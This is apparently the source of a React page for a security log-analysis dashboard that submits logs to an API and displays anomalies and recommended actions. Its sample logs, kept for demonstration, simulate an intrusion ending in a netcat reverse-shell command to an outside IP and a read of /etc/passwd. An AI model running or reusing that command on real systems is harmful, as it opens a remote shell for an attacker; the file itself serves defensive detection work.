import { useState } from 'react'
import { scans } from './api'

const PILL = { safe: ['#E1F5EE','#085041'], low: ['#FAEEDA','#633806'], medium: ['#FAEEDA','#854F0B'], high: ['#FCEBEB','#791F1F'], critical: ['#FCEBEB','#501313'] }
function Pill({ level }) {
  const [bg, col] = PILL[level?.toLowerCase()] || PILL.safe
  return <span style={{ fontSize: 11, fontWeight: 500, padding: '3px 9px', borderRadius: 20, background: bg, color: col }}>{level}</span>
}
function Card({ children, style }) {
  return <div style={{ background: '#fff', border: '0.5px solid #e0ded8', borderRadius: 12, padding: 16, ...style }}>{children}</div>
}

const SAMPLE_LOGS = `2026-05-30 02:11:33 FAILED LOGIN user=admin ip=185.220.101.45
2026-05-30 02:11:34 FAILED LOGIN user=admin ip=185.220.101.45
2026-05-30 02:11:35 FAILED LOGIN user=root ip=185.220.101.45
2026-05-30 02:11:36 FAILED LOGIN user=admin ip=185.220.101.45
2026-05-30 02:11:37 SUCCESS LOGIN user=admin ip=185.220.101.45
2026-05-30 02:11:41 FILE ACCESS /etc/passwd user=admin ip=185.220.101.45
2026-05-30 02:11:45 OUTBOUND CONNECTION ip=185.220.101.45 port=4444
2026-05-30 02:12:01 PROCESS EXEC cmd=nc -e /bin/sh 185.220.101.45 4444`

export default function ShieldSOC() {
  const [apiKey, setApiKey] = useState('')
  const [logs, setLogs] = useState(SAMPLE_LOGS)
  const [source, setSource] = useState('auth_logs')
  const [timeframe, setTimeframe] = useState(60)
  const [result, setResult] = useState(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  const run = async () => {
    if (!apiKey) { setError('Enter your API key'); return }
    if (!logs.trim()) { setError('Paste some logs to analyze'); return }
    setLoading(true); setError(''); setResult(null)
    try {
      const logLines = logs.split('\n').filter(l => l.trim())
      const res = await scans.logs(apiKey, { logs: logLines, source, timeframe_minutes: timeframe })
      setResult(res)
    } catch(e) { setError(e.message) }
    setLoading(false)
  }

  const SEV_COLORS = { critical: ['#FCEBEB','#501313'], high: ['#FCEBEB','#791F1F'], medium: ['#FAEEDA','#854F0B'], low: ['#FAEEDA','#633806'] }

  return (
    <div>
      <div style={{ marginBottom: 20 }}>
        <h1 style={{ fontSize: 18, fontWeight: 500, marginBottom: 4 }}>Shield SOC</h1>
        <p style={{ fontSize: 13, color: '#888' }}>Analyze system logs for threats, anomalies, and attack patterns</p>
      </div>

      <Card style={{ marginBottom: 16 }}>
        <div style={{ fontSize: 13, fontWeight: 500, marginBottom: 10 }}>API Key</div>
        <input placeholder="sm_live_..." value={apiKey} onChange={e => setApiKey(e.target.value)} style={{ width: '100%', fontFamily: 'monospace', fontSize: 12 }} />
      </Card>

      <Card style={{ marginBottom: 16 }}>
        <div style={{ display: 'flex', gap: 10, marginBottom: 12 }}>
          <div style={{ flex: 2 }}>
            <div style={{ fontSize: 12, color: '#888', marginBottom: 4 }}>Log source</div>
            <select value={source} onChange={e => setSource(e.target.value)} style={{ width: '100%' }}>
              {['auth_logs','system_logs','network_logs','application_logs','firewall_logs','cloud_trail'].map(s => (
                <option key={s} value={s}>{s.replace('_',' ')}</option>
              ))}
            </select>
          </div>
          <div style={{ flex: 1 }}>
            <div style={{ fontSize: 12, color: '#888', marginBottom: 4 }}>Timeframe (mins)</div>
            <select value={timeframe} onChange={e => setTimeframe(Number(e.target.value))} style={{ width: '100%' }}>
              {[5,15,30,60,120,360,1440].map(t => <option key={t} value={t}>{t} min{t>1?'s':''}</option>)}
            </select>
          </div>
        </div>

        <div style={{ fontSize: 12, color: '#888', marginBottom: 6 }}>Paste logs</div>
        <textarea value={logs} onChange={e => setLogs(e.target.value)} rows={10} style={{ width: '100%', fontFamily: 'monospace', fontSize: 11, resize: 'vertical', padding: 10, border: '0.5px solid #e0ded8', borderRadius: 8, background: '#0f1117', color: '#e0e0e0', lineHeight: 1.7 }} />
        <div style={{ fontSize: 11, color: '#aaa', marginTop: 4 }}>Sample logs loaded — edit or replace with your own</div>

        {error && <div style={{ background: '#FCEBEB', color: '#791F1F', fontSize: 12, padding: '8px 12px', borderRadius: 8, marginTop: 10 }}>{error}</div>}

        <button onClick={run} disabled={loading} style={{ marginTop: 12, padding: '9px 20px', background: '#D85A30', color: '#fff', border: 'none', borderRadius: 8, fontSize: 13, fontWeight: 500, cursor: 'pointer', opacity: loading?0.7:1 }}>
          {loading ? 'Analyzing...' : 'Analyze logs'}
        </button>
      </Card>

      {result && (
        <>
          <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr 1fr', gap: 12, marginBottom: 16 }}>
            <div style={{ background: '#fff', border: '0.5px solid #e0ded8', borderRadius: 10, padding: '14px 16px' }}>
              <div style={{ fontSize: 11, color: '#aaa', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.04em' }}>Incident summary</div>
              <div style={{ fontSize: 13, color: '#333', lineHeight: 1.6 }}>{result.incident_summary}</div>
            </div>
            <div style={{ background: '#f9f8f5', borderRadius: 10, padding: '14px 16px', textAlign: 'center' }}>
              <div style={{ fontSize: 11, color: '#aaa', marginBottom: 8 }}>Threat level</div>
              <Pill level={result.threat_level} />
            </div>
            <div style={{ background: '#f9f8f5', borderRadius: 10, padding: '14px 16px', textAlign: 'center' }}>
              <div style={{ fontSize: 28, fontWeight: 500, color: result.anomalies?.length>0?'#E24B4A':'#1D9E75' }}>{result.anomalies?.length || 0}</div>
              <div style={{ fontSize: 11, color: '#aaa' }}>Anomalies</div>
            </div>
          </div>

          {result.anomalies?.length > 0 && (
            <Card style={{ marginBottom: 12 }}>
              <div style={{ fontSize: 13, fontWeight: 500, marginBottom: 12 }}>Anomalies detected</div>
              {result.anomalies.map((a, i) => {
                const [bg, col] = SEV_COLORS[a.severity?.toLowerCase()] || SEV_COLORS.medium
                return (
                  <div key={i} style={{ padding: '10px 0', borderBottom: i<result.anomalies.length-1?'0.5px solid #f0eee8':'none' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
                      <span style={{ fontSize: 11, fontWeight: 500, padding: '2px 8px', borderRadius: 20, background: bg, color: col }}>{a.severity}</span>
                      <span style={{ fontSize: 13, fontWeight: 500 }}>{a.type}</span>
                      {a.timestamp && <span style={{ fontSize: 11, color: '#aaa' }}>{a.timestamp}</span>}
                    </div>
                    <div style={{ fontSize: 12, color: '#555', marginBottom: a.raw_indicator?4:0 }}>{a.description}</div>
                    {a.raw_indicator && <code style={{ fontSize: 11, background: '#f1efe8', padding: '3px 8px', borderRadius: 6, color: '#666' }}>{a.raw_indicator}</code>}
                  </div>
                )
              })}
            </Card>
          )}

          {result.affected_assets?.length > 0 && (
            <Card style={{ marginBottom: 12 }}>
              <div style={{ fontSize: 13, fontWeight: 500, marginBottom: 10 }}>Affected assets</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8 }}>
                {result.affected_assets.map((a,i) => (
                  <span key={i} style={{ fontSize: 12, fontFamily: 'monospace', background: '#FAECE7', color: '#993C1D', padding: '4px 10px', borderRadius: 6 }}>{a}</span>
                ))}
              </div>
            </Card>
          )}

          {result.recommended_actions?.length > 0 && (
            <Card>
              <div style={{ fontSize: 13, fontWeight: 500, marginBottom: 10 }}>
                Recommended actions
                {result.auto_remediated && <span style={{ marginLeft: 8, fontSize: 11, background: '#E1F5EE', color: '#085041', padding: '2px 8px', borderRadius: 20 }}>Auto-remediated</span>}
              </div>
              {result.recommended_actions.map((a, i) => (
                <div key={i} style={{ display: 'flex', gap: 8, fontSize: 12, color: '#444', padding: '6px 0', borderBottom: i<result.recommended_actions.length-1?'0.5px solid #f0eee8':'none' }}>
                  <span style={{ color: '#D85A30', fontWeight: 500, flexShrink: 0 }}>{i+1}.</span>{a}
                </div>
              ))}
            </Card>
          )}
        </>
      )}
    </div>
  )
}
